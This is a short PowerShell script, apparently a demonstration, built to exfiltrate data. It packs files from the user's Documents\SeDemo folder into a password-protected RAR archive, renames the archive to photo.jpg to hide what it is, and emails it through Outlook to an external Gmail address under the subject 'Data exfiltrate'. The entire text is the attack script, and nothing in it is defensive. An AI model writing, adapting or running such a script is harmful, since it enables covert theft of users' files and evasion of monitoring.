#Folder creation for exfiltration
New-Item -ItemType directory -Path c:\export;
#Random password generation
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)
#variables
$ZipOutputFilePath="c:\export\export.rar"
$FilesToZip="$Env:USERPROFILE\Documents\SeDemo\*.*"
$pathToWinrar = "C:\Program Files\WinRAR\WinRAR.exe"
$arguments = "a -p$randomPassword $ZipOutputFilePath $FilesToZip"
$windowStyle = "Normal"
#creating zip file with previous random password
$p = Start-Process $pathToWinrar -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle
rename-item $ZipOutputFilePath -newname "photo.jpg"
#sending zip file by email using outlook
$Outlook = New-Object -ComObject Outlook.Application
$Mail = $Outlook.CreateItem(0)
$Mail.To = "sedemonko@gmail.com"
$Mail.Subject = "Data exfiltrate"
$Mail.Body ="You are welcome"
#attachments = New-Object Net.Mail.Attachment("c:\export\photo.jpg");
$Mail.Attachments.Add( "c:\export\photo.jpg" );
$Mail.Send() ;
